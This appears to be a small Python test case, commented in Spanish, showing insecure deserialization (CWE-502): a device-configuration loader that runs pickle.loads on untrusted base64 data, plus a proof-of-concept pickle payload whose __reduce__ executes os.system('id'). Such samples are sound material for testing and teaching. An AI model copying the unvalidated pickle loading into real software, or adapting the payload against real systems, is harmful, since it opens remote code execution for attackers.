# T16_InsecureDeserializationCase.py
import pickle
import base64

def load_device_config(encoded_data):
    """
    CWE-502: Deserialización insegura de configuración de dispositivo.
    El gateway recibe configuraciones codificadas en base64 desde
    dispositivos remotos y las deserializa directamente sin validación.
    """
    # FALLO: pickle.loads sobre datos externos no confiables
    raw = base64.b64decode(encoded_data)
    config = pickle.loads(raw)
    return config

if __name__ == "__main__":
    # Simulación de payload malicioso serializado
    import os
    class Exploit:
        def __reduce__(self):
            return (os.system, ("id",))
    
    payload = base64.b64encode(pickle.dumps(Exploit())).decode()
    load_device_config(payload)